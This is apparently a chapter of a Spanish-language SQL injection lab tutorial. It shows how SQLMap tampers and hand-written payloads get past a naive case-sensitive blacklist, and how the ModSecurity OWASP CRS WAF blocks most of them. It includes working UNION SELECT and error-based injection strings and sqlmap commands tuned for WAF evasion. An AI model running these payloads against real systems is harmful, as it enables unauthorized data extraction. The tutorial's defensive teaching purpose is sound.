# 05 — Tampers y evasión de controles (filtros / WAF)

Dos capas defensivas de ejemplo y cómo se comportan frente a la ofuscación:
1. **Filtro ingenuo** (blacklist a nivel app) — `app-vuln-filter`, puerto **3002**.
2. **WAF real** (ModSecurity + OWASP CRS) — puerto **8080**, delante de `app-vuln`.

## 5.1 — ¿Qué es un tamper?
Un *tamper* de SQLMap transforma el payload para evadir filtros sin cambiar su efecto
SQL. Ejemplos:

| Tamper | Transformación | Evade |
|---|---|---|
| `lowercase` | `UNION`→`union` | blacklists case-sensitive |
| `space2comment` | espacio → `/**/` | filtros que exigen espacios |
| `charencode` | URL-encode | filtros que miran texto plano |
| `between` | `>` → `NOT BETWEEN 0 AND` | bloqueo de operadores |
| `equaltolike` | `=` → `LIKE` | bloqueo de `=` |
| `versionedkeywords` | `UNION`→`/*!UNION*/` | filtros simples de palabras |

Uso: `--tamper=lowercase,space2comment` o `--tamper=space2comment,charencode,between`.

## 5.2 — Filtro ingenuo (blacklist) y su evasión  [DEMOSTRADO]
El filtro (`app/src/middleware/naiveFilter.js`) bloquea palabras clave pero de forma
**case-sensitive** (solo mayúsculas): el error clásico.

| Petición a `:3002` | Resultado | Motivo |
|---|---|---|
| `/?q=zzz' UNION SELECT ... FROM users-- -` | **HTTP 403** | contiene `UNION`/`SELECT` en mayúsculas |
| `/?q=zzz' union select ... from users-- -` | **200 + volcado** | SQL es case-insensitive; la blacklist no mira minúsculas |

Equivale a `sqlmap ... -p q --tamper=lowercase`. **Conclusión: el blacklisting falla.**

## 5.3 — WAF (ModSecurity + CRS) y su robustez  [DEMOSTRADO]
Con CRS en modo bloqueo (anomaly scoring, PL1), las reglas de la familia **942xxx**
(`REQUEST-942-APPLICATION-ATTACK-SQLI`) detectan los patrones SQLi.

| Petición a `:8080` | Resultado |
|---|---|
| `GET /?q=teclado` (normal) | **200** |
| `/?q=zzz' UNION SELECT 1,2,3,4,5,6-- -` | **403** |
| `/?q=1' OR '1'='1` | **403** |
| `/?q=zzz' union select ...` (minúscula) | **403** (CRS normaliza y bloquea igual) |
| `/?q=zzz'/**/UNION/**/SELECT/**/...` | **403** |
| `/*!50000UNION*/ /*!50000SELECT*/` | **403** |
| `uNiOn sElEcT` (random case) | **403** |

A diferencia del filtro ingenuo, **CRS normaliza** (minúsculas, comentarios, encoding)
antes de evaluar, por lo que los tampers simples **no** lo evaden a PL1.

### Matiz importante (los WAF no son perfectos)
El payload **error-based** por la ruta (`/products/1 AND extractvalue(1,concat(0x7e,version()))`)
atravesó el WAF y llegó a la app (HTTP 500): no todo patrón queda cubierto por las
reglas por defecto. Esto refuerza que **el WAF es defensa en profundidad, no la
solución**. La solución es corregir el código (capítulo 06).

### Cómo atacar con SQLMap a través del WAF
```
# sin tamper -> SQLMap reporta que el objetivo está detrás de un WAF/IPS y es bloqueado
sqlmap -u "http://localhost:8080/?q=teclado" -p q --batch

# con tampers (metodología; a PL1 de CRS puede seguir bloqueando)
sqlmap -u "http://localhost:8080/?q=teclado" -p q --batch \
       --tamper=space2comment,charencode,between,equaltolike \
       --random-agent --level 5 --risk 3
```
> Para evaluar evasión real, bajar el WAF a `PARANOIA=1` vs subirlo, o probar contra el
> filtro ingenuo (:3002), que ilustra el concepto de forma inequívoca.

## 5.4 — Lectura comparativa
| Control | ¿Evadible con tamper simple? | ¿Mitiga la causa raíz? |
|---|---|---|
| Blacklist ingenua (app) | **Sí** (lowercase) | No |
| WAF CRS (PL1) | Difícil a PL1 | No (sólo reduce exposición) |
| **Parametrización (ORM correcto)** | — | **Sí** |

El orden correcto de defensa: **corregir el código** (causa raíz) + **mínimo
privilegio** + **WAF** como capa adicional.
